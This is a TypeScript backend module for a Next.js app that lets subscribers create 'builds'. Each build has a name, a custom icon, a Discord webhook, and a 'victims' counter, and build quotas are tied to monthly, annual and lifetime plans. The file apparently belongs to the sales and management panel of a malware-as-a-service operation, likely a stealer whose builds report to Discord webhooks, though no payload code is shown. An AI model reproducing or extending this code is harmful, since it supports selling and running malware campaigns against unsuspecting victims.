import type { NextApiRequest } from 'next';
import type { Db } from 'mongodb';
import type { Build, User } from '@/interfaces';
import { randomUUID } from 'node:crypto';
import { resolve } from 'node:path';
import { v2 as cloudinary } from 'cloudinary';
import formidable from 'formidable';

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_NAME || '',
  api_key: process.env.CLOUDINARY_APIKEY || '',
  api_secret: process.env.CLOUDINARY_APISECRET || ''
});

export const getBuildId = async (db: Db, id: string, owner: string) => {
  const collection = db.collection('builds');
  const build = (await collection.findOne({ id })) as Build | null;
  if (!build) throw Error('This build does not exist!');
  if (build.owner.id !== owner) throw Error('This build is not your property');
  return build;
};

export const getAllBuilds = async (db: Db, id: string) => {
  const collection = db.collection('builds');
  const builds = await collection.find({ 'owner.id': id }).toArray();
  return {
    count: builds.length,
    data: builds
  };
};

export const parseForm = async (
  req: NextApiRequest
): Promise<{ fields: formidable.Fields; files: formidable.Files }> => {
  const uploadDir = resolve(__dirname, '/', 'home', 'fifix', 'xannax', 'assets');
  return await new Promise(async (resolve, reject) => {
    const form = formidable({
      maxFiles: 10,
      maxFileSize: 1024 * 1024 * 10,
      uploadDir,
      filename: (_name, _ext, part) => {
        const uniqueSuffix = `${Date.now()}-${Math.round(Math.random() * 1e9)}`;
        const filename = `${part.name || 'unknown'}-${uniqueSuffix}.ico`;
        return filename;
      },
      filter: (part) => {
        return part.name === 'icon' && (part.mimetype?.includes('x-icon') || false);
      }
    });

    form.parse(req, function (err, fields, files) {
      if (err) reject(err);
      else resolve({ fields, files });
    });
  });
};

const validateMaxOfBuilds = (plan: string, builds: number): boolean => {
  if (plan === 'monthly' && builds >= 2) return false;
  if (plan === 'annual' && builds >= 5) return false;
  if (plan === 'lifetime' && builds >= 30) return false;
  return true;
};

export const createBuild = async (db: Db, ownerId: string, req: NextApiRequest) => {
  const { fields, files } = await parseForm(req);
  let name = fields.name && fields.name[0];
  let description = fields.description && fields.description[0];
  let webhook = fields?.webhook ? fields.webhook[0] : undefined;
  let file = files.icon;
  let icon = Array.isArray(file) ? file[0] : file;

  const url = /https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/[0-9]{17,19}\/([a-zA-Z0-9-_]+)/g;
  const symbols = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/;
  const letters = /^[a-zA-Z0-9\s]+$/;
  if (name && symbols.test(name)) throw Error('The name cannot contain symbols!');
  if (name && !letters.test(name)) throw Error('Invalid name!');
  if (!name || name.length > 20 || name.length <= 3) throw Error('Name invalid!');

  if (webhook && !url.test(webhook)) throw Error('Webhook invalid!');
  if (description && description.length > 50) throw Error('Description invalid!');

  const user = db.collection('users');
  const collection = db.collection('builds');

  const owner = (await user.findOne({ id: ownerId })) as User | null;
  if (!owner) throw Error('Owner invalid!');
  const plan = owner?.subscription?.name;
  const totalBuilds = await collection.find({ 'owner.id': ownerId }).toArray();
  if (plan && !validateMaxOfBuilds(plan, totalBuilds.length))
    throw Error('You already have the maximum limit of builds created!');

  const id = randomUUID();
  const formatName = name.split(' ').join('_').trim();
  try {
    const data = icon ? await cloudinary.uploader.upload(icon.filepath) : null;

    await collection.insertOne({
      id,
      icon: data ? data.secure_url : null,
      name: formatName,
      description,
      victims: 0,
      webhook,
      metadata: {
        status: false
      },
      owner,
      created_at: new Date()
    } as Build);
  
       
  } catch (error: any) {
    throw Error(error?.message);
  }

  return {
    formatName,
    id
  };
};
